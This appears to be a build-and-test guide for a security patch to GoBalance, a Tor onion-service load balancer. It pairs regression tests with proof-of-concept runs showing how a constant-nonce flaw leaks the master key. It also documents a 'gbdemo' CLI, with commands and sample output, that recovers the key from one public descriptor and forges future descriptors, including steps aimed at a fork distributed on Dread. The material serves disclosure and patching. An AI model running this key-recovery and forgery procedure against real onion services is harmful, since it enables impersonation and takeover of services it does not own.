# Building and Testing the GoBalance Patch & PoC

This guide walks through applying the patch, building the code, and running
the proof-of-concept to verify (a) the attack works against the vulnerable
snapshot and (b) the patched code defeats it. Everything runs locally on
freshly generated keys - **no Tor daemon, no onion services, and no network
access to any real service are involved.**

---

## 1. Prerequisites

| Requirement | Detail |
|---|---|
| Go | ≥ 1.18 (`go.mod` declares `go 1.18`); package verified with **Go 1.21.13 linux/amd64** |
| git | Only for Option A (patching a fresh checkout) |
| Time | Under 1 minute for the full test suite |
| Network | Only the first `go build` needs module downloads; afterwards tests run fully offline |

## 2. Package layout

```
gobalance-patch/
├── gobalance-security.patch   unified diff against upstream master@bb1b0f3
└── gobalance-patched/         complete pre-patched source tree
    ├── main.go, go.mod, go.sum
    ├── pkg/…                  patched libraries (with regression tests)
    ├── poc/                   attack demo + vulnerable snapshot
    │   ├── attack_demo_test.go
    │   └── vulnerable/        read-only copy of the vulnerable signing code
    ├── cmd/gbdemo/            standalone recovery demo CLI (see #13) + E2E tests
    └── tools/                 pem2tor.py (key format converter),
                              get_desc.py (descriptor fetch via control port)

gobalance-v1/                 community fork "GoBalance Enhanced v1.0" (Dread),
                              bundled as distributed - still VULNERABLE (see #14)
```

## 3. Step 1 - Prepare a source tree

### Option A - patch a fresh upstream checkout

```bash
git clone https://gitlab.com/n0tr1v/gobalance
cd gobalance
git apply --check /path/to/gobalance-security.patch   # dry run; should print nothing
git apply /path/to/gobalance-security.patch
```

The patch targets **master @ `bb1b0f3`**. If upstream has moved on and the
dry run fails, fall back to Option B or retry with `git apply --3way`.

### Option B - use the bundled pre-patched tree (recommended)

```bash
cd /path/to/gobalance-patch/gobalance-patched
```

No patching needed; this tree already contains every fix described in
[`README.md`](README.md).

## 4. Step 2 - Build and vet

```bash
go build ./...
go vet ./...
```

Expected: both exit silently (success). If module downloads are blocked in
your environment, run `go mod vendor` once with network access, then build
with `go build -mod=vendor ./...`.

## 5. Step 3 - Run the end-to-end attack demo

```bash
go test ./poc/ -v
```

Expected output (scalar values differ every run because keys are generated
fresh; timings are approximate):

```
=== RUN   Test01_Vulnerable_MasterKeyRecoveredFromSingleDescriptor
    attack_demo_test.go:111: [ATTACK] master scalar recovered mod L: 05160a40d820566e2b601e2392e57bcc284f64971785edd2c41d6f933b5c0182
    attack_demo_test.go:118: [TAKEOVER] forged period-2 signature matches the victim's real signature byte-for-byte
    attack_demo_test.go:119: [TAKEOVER] => attacker can impersonate the onion service for ANY future period
--- PASS: Test01_Vulnerable_MasterKeyRecoveredFromSingleDescriptor (0.03s)
=== RUN   Test02_Patched_TruncatedTorKeyRejected
    attack_demo_test.go:135: [DEFENSE] rejected truncated key: BlindedSignWithTorKey: identityKey must be the full 64-byte tor extended key (a||h); got 32 bytes - a truncated key would publish a constant nonce prefix and leak the master identity key
--- PASS: Test02_Patched_TruncatedTorKeyRejected (0.01s)
=== RUN   Test03_Patched_TorPathSignaturesVerifyAsStdEd25519
    attack_demo_test.go:156: [COMPAT] patched tor-path signatures verify as standard ed25519 under the blinded pubkey
--- PASS: Test03_Patched_TorPathSignaturesVerifyAsStdEd25519 (0.02s)
=== RUN   Test04_Patched_AttackMathYieldsGarbage
    attack_demo_test.go:187: [DEFENSE] attacker-recovered value (garbage): 052d581ec63da9e8cd8ddbcac16326c79e8823d4177857fb6937486ae0cbd351
    attack_demo_test.go:188: [DEFENSE] true master scalar              : 50a5edaf0dba3a9c32c96ee169e5c7a4409f6b00ce406963222097d617860618
    attack_demo_test.go:189: [DEFENSE] => nonce prefix is now keyed by the secret PRF half; recovery is computationally dead
--- PASS: Test04_Patched_AttackMathYieldsGarbage (0.01s)
PASS
ok      gobalance/poc   0.072s
```

How to read it:

- **Test01** runs the attack against the *vulnerable snapshot* bundled in
  `poc/vulnerable/`. It recovers the master scalar from a single public
  descriptor and forges a signature for a future time period that is
  byte-for-byte identical to the victim's real signature. This is the
  takeover primitive.
- **Test02** feeds the same 32-byte truncated key into the *patched*
  signer. It must panic - the panic message names the exact risk.
- **Test03** confirms the patched tor-path signatures are still standard
  ed25519 under the blinded public key (Tor compatibility unchanged).
- **Test04** replays the identical attack math against patched output: the
  recovered "scalar" is garbage and does not match the true master scalar,
  proving the nonce prefix is now keyed by the secret PRF half.

## 6. Step 4 - Run the crypto regression tests

```bash
go test ./pkg/stem/util/ -run 'Attack|Rejects|Control|PatchedTorPath' -v
```

Expected (trimmed; upstream tests like `TestBlindedSign` also run and pass):

```
=== RUN   TestAttackFailsOnPatchedTorPath
--- PASS: TestAttackFailsOnPatchedTorPath (0.03s)
=== RUN   TestBlindedSignWithTorKey_RejectsTruncatedKey
--- PASS: TestBlindedSignWithTorKey_RejectsTruncatedKey (0.01s)
=== RUN   TestBlindedSign_RejectsNonSeed
--- PASS: TestBlindedSign_RejectsNonSeed (0.01s)
=== RUN   TestControl_SeedFormatPathIsSafe
    attack_poc_test.go:235: CONTROL PASSED: seed-format (PEM) path does not leak the scalar - flaw was isolated to the tor-format path
--- PASS: TestControl_SeedFormatPathIsSafe (0.01s)
=== RUN   TestGobpkNew_RejectsTruncatedTorKey
--- PASS: TestGobpkNew_RejectsTruncatedTorKey (0.00s)
PASS
ok      gobalance/pkg/stem/util 0.059s
```

Forged-descriptor PoC (vulnerability #2):

```bash
go test ./pkg/stem/descriptor/ -run Forged -v
```

Expected (the onion address is a locally generated test value):

```
=== RUN   TestForgedSelfConsistentDescriptorIsDetected
    forged_descriptor_poc_test.go:70: [DEMONSTRATED] self-consistent forged descriptor passes parse + cert-sig + descriptor-sig checks
    forged_descriptor_poc_test.go:71:                 => pre-patch RegisterDescriptor would accept it and republish attacker intro points
    forged_descriptor_poc_test.go:79: [DEFENSE] binding check rejected the forged descriptor for yto3ctmugxtebyfzl2qpqbu3lrh3ugou6425ef2zxeqaaiiyaauzmxad.onion
--- PASS: TestForgedSelfConsistentDescriptorIsDetected (0.02s)
PASS
ok      gobalance/pkg/stem/descriptor   0.029s
```

Frontend intake verification:

```bash
go test ./pkg/onionbalance/descriptor/ -v
```

Expected:

```
--- PASS: TestNewReceivedDescriptor_AcceptsHonestDescriptor
--- PASS: TestNewReceivedDescriptor_RejectsTamperedSignature
--- PASS: TestNewReceivedDescriptor_RejectsWrongIdentityBinding
```

## 7. Step 5 - Full suite

```bash
go test ./...
```

Expected: **9 packages report `ok`** (`poc`, `cmd/gbdemo`,
`pkg/stem/descriptor`, `pkg/stem/util`, `pkg/onionbalance/descriptor`,
`pkg/onionbalance/stem`, `pkg/onionbalance/controller`,
`pkg/onionbalance/consensus`, `pkg/onionbalance/utils`), the remaining
packages report "no test files", **0 failures**.

## 8. Test ↔ vulnerability map

| Vulnerability | Test | File |
|---|---|---|
| #1 attack demo (recovery + forgery) | `Test01_Vulnerable_MasterKeyRecoveredFromSingleDescriptor` | `poc/attack_demo_test.go` |
| #1 truncated-key guards | `Test02_Patched_TruncatedTorKeyRejected`, `TestBlindedSignWithTorKey_RejectsTruncatedKey`, `TestBlindedSign_RejectsNonSeed`, `TestGobpkNew_RejectsTruncatedTorKey` | `poc/` + `pkg/stem/util/attack_poc_test.go` |
| #1 attack dead on patched path | `Test04_Patched_AttackMathYieldsGarbage`, `TestAttackFailsOnPatchedTorPath` | `poc/` + `pkg/stem/util/attack_poc_test.go` |
| #1 control (seed path was safe) | `TestControl_SeedFormatPathIsSafe` | `pkg/stem/util/attack_poc_test.go` |
| #1 Tor compatibility | `Test03_Patched_TorPathSignaturesVerifyAsStdEd25519`, `TestPatchedTorPath_ProducesValidEd25519Signatures` | `poc/` + `pkg/stem/util/attack_poc_test.go` |
| #2 forged descriptor detected | `TestForgedSelfConsistentDescriptorIsDetected` | `pkg/stem/descriptor/forged_descriptor_poc_test.go` |
| #2 intake verification | `TestNewReceivedDescriptor_AcceptsHonestDescriptor` / `_RejectsTamperedSignature` / `_RejectsWrongIdentityBinding` | `pkg/onionbalance/descriptor/verification_poc_test.go` |

## 9. Manually confirming the fix in the source

A few greps show the core changes in place:

```bash
# dispatcher now sends the FULL 64-byte extended key (was identityKey.Seed())
grep -n "BlindedSignWithTorKey(msg, identityKey.PrivKey()" pkg/stem/descriptor/hidden_service.go
# → pkg/stem/descriptor/hidden_service.go:170

# explicit 64-byte guard in the signer
grep -n "tor extended key" pkg/stem/util/ed25519.go
# → panic guard around line 53

# new three-layer descriptor verifier exists and is wired into intake
grep -rn "VerifyHiddenServiceDescriptorV3" pkg/ --include="*.go" -l
# → pkg/stem/descriptor/hidden_service.go, pkg/onionbalance/descriptor/descriptor.go

# deterministic RNG path gone; crypto/rand only
grep -n "crypto/rand" pkg/brand/brand.go

# instance registration now takes consensus-derived expected blinded keys
grep -n "expectedBlindedKeys" pkg/onionbalance/instance/instance.go
# → RegisterDescriptor(..., expectedBlindedKeys ...ed25519.PublicKey) at line 118
```

## 10. Troubleshooting

| Symptom | Cause & fix |
|---|---|
| `git apply` fails or prints offsets | Upstream moved past `bb1b0f3`. Use `git apply --3way`, or just use the bundled `gobalance-patched/` tree. |
| `go: command not found` | Install Go ≥ 1.18 from <https://go.dev/dl/> and ensure `go` is on `PATH`. |
| Module download errors / offline build | Run `go mod vendor` once with network, then `go build -mod=vendor ./...` and `go test -mod=vendor ./...`. |
| Test01 "PASS" looks alarming | It is supposed to pass: it demonstrates the attack against the deliberately vulnerable snapshot, which is the evidence the patch is needed. The same attack on the patched path is asserted dead by Test02/Test04 and the unit guards. |
| A guard panic appears in normal operation | You are passing a 32-byte seed where a 64-byte tor extended key is required. That call site is precisely the vulnerability - the panic is the fix working. Use `toredd25519.LoadTorKeyFromDisk` / `gobpk.PrivateKey.PrivKey()` to obtain the full key. |

## 11. Safety and ethics

- Every key in this package is generated locally at test time; the PoC never
  contacts HSDirs, directories, or any real onion service.
- Only run these tests against code and keys you own.

## 12. Post-fix operational checklist (operators)

1. Apply the patch (or deploy the rebuilt `gobalance-patched` binary) and
   confirm `go test ./...` is green on your build.
2. **If the frontend ever published descriptors while running vulnerable
   code, rotate the onion identity.** A descriptor that was already public
   cannot be retracted, and vulnerability #1 means one descriptor was enough
   to recover the master key. The patch protects the future, not the past.
3. Expect fail-closed behavior: without a live consensus the frontend now
   refuses to register instance descriptors. That refusal is a security
   feature, not a bug.
4. Do not rely on the upstream `patch1` branch - it fixes neither critical
   vulnerability.

## 13. Live demo against your own onion service (`gbdemo`)

The `poc/` tests prove the attack on synthetic descriptors. `cmd/gbdemo`
packages the same math into a CLI so an operator can point it at a
descriptor published by their **own** deployment and see the leak on real
data. Build and smoke-test it:

```bash
cd gobalance-patched
go build -o gbdemo ./cmd/gbdemo
./gbdemo simulate            # self-contained: local throwaway keys, no Tor
go test ./cmd/gbdemo/ -v     # 3 E2E tests: real cert layout, honest-failure paths
```

Modes:

```bash
./gbdemo attack -d descriptor.txt -a <56-char master onion>
./gbdemo forge  -d descriptor.txt -a <master onion>   # signs for the NEXT period
```

`forge` verifies the forged signature as standard ed25519 under the
blinded public key of a future time period - the takeover primitive.

### 13.1 Which address is the target?

In an OnionBalance-style deployment the **master** (frontend) address is
the one users visit; backend **instance** addresses never appear in any
public descriptor. The attack therefore targets the *master* address and
the descriptor the dispatcher publishes for it. An instance descriptor is
signed by real Tor (correct crypto) - attacking it fails honestly, which
is the tool telling you that you aimed at the wrong layer.

### 13.2 The master key file format decides everything

`gobalance` picks its signing path from the on-disk master key format:

| Key file | Signing path | `gbdemo attack` result |
|---|---|---|
| PEM/PKCS8 text file (what `generate-config` writes) | safe, keyed nonce | honest failure (by design) |
| Tor format `== ed25519v1-secret: type0 ==` (mkp224o output, or a reused `hs_ed25519_secret_key`) | **vulnerable constant-nonce path** | **master scalar recovered** |

Convert an existing PEM master key to Tor format *without changing the
onion address*:

```bash
python3 tools/pem2tor.py master.key master_tor.key
# prints the derived onion address - must match your current frontend address
```

Point `config.yaml` `key:` at `master_tor.key`, restart gobalance, and let
it publish.

### 13.3 Fetching the descriptor (the attacker's step, on your own service)

```bash
apt install python3-stem
python3 tools/get_desc.py <master onion> --port 9052 -o descriptor.txt
```

This is exactly what every Tor client does via the HSDirs when someone
visits the site - no access to the server is involved. Always fetch a
**fresh** descriptor after any key or config change.

### 13.4 Expected result

```text
[4/5] locating time period (reproduce the blinding parameter from public inputs)
      time period 20734: blinding param = dc4f6436…
      blinded pubkey reproduced from (identity pub + period) - MATCH
[5/5] recovery: r = H(kPrime||M);  s' = (S - r)*H(R||A'||M)^-1 mod L;  a = s'*mult^-1 mod L
      MASTER SCALAR a   = 90c48751…
      VERIFY: [a]B == identity pubkey of the onion address  >>> MASTER KEY RECOVERED FROM ONE PUBLIC DESCRIPTOR <<<

[FORGE] target time period 20735 (descriptor period 20734 + 1)
        VERIFY: standard ed25519 verification under the blinded pubkey = TRUE
        => the recovered key signs VALID descriptors for ANY future period (takeover primitive)
```

(Values from a real lab run against the author's own test deployment;
scalars truncated.)

### 13.5 Honest-failure troubleshooting

`gbdemo attack` refuses to lie: if the recovered scalar does not reproduce
the onion pubkey it stops with a diagnostic instead of guessing. When the
diagnostic says `[s']B != A'` (nonce was NOT the public constant), the
causes in the order usually seen:

| # | Cause | Fix |
|---|---|---|
| 1 | Descriptor belongs to a backend **instance** (Tor-signed) or a different onion than `-a` | Fetch the descriptor of the **master** address |
| 2 | Master key is **PEM/PKCS8** → safe signing path | `tools/pem2tor.py`, restart, re-fetch |
| 3 | Descriptor captured **before** the key switch | Fetch a fresh descriptor after the restart |

## 14. Testing the community fork "GoBalance Enhanced v1.0" (Dread)

`gobalance-v1/` contains the v1.0 fork as distributed on Dread
("GoBalance Enhanced"), bundled byte-for-byte for community testing. It is
a separate Go module - build and run it from its own directory:

```bash
cd gobalance-v1
go build -o gobalance-v1 .
# torrc included (ControlPort 9053, cookie authentication)
```

Vulnerability status, confirmed against this tree:

- **Flaw #1 is present**: `pkg/stem/descriptor/hidden_service.go:128`
  still calls `util.BlindedSignWithTorKey(msg, identityKey.Seed(), …)`,
  passing the 32-byte seed where the 64-byte extended key `(a||h)` is
  required.
- `pkg/stem/util/ed25519.go` matches the vulnerable upstream
  implementation (cosmetic differences only; the constant-nonce path is
  identical).
- Same precondition as upstream: its `generate-config` writes a PEM
  master key (safe path). The vulnerable path fires only with a
  Tor-format master key - convert one with
  `../gobalance-patched/tools/pem2tor.py` and point the fork's config at
  it.
- The full #13 walkthrough applies unchanged: build `gbdemo` from
  `gobalance-patched/`, fetch the fork's master descriptor with
  `get_desc.py`, and run `attack`/`forge` against the master address.

Ethics unchanged: run this **only** against hidden services you own. If a
deployment ever published a descriptor through the vulnerable path,
rotate the onion identity - the patch protects the future, not the past.
